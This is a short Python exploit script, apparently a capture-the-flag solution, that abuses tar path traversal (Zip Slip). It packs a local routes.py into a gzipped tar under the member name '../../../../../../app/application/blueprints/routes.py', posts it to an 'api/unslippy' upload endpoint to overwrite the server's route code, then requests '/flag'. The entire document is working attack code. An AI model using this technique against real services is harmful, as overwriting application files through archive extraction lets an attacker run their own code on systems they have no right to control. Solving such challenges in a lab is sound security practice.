#!/usr/bin/python3


import io
import requests
import tarfile
import sys
import time


def main():
    
    try:
        url = sys.argv[1]
        base_dir = "../../../../../../app/application/blueprints/routes.py"
        base_file = "routes.py"

        with open(base_file, "r") as f:
            data = f.read()


        source_f = io.BytesIO(initial_bytes=data.encode())
        fh = io.BytesIO()

        with tarfile.open(fileobj=fh, mode="w:gz") as tar:
            info = tarfile.TarInfo(base_dir)

            info.size = len(data)
            info.mtime = time.time()
            tar.addfile(info, source_f)

        with open("test.tar.gz", "wb") as f:
            f.write(fh.getvalue())

        sess = requests.session()

        ress = sess.post(url=url+"api/unslippy", files={"file":fh.getvalue()})

        print(ress.text)

        print(sess.get(url+"flag").text)
    except Exception as e:
        pass


if __name__ == "__main__":
    main()
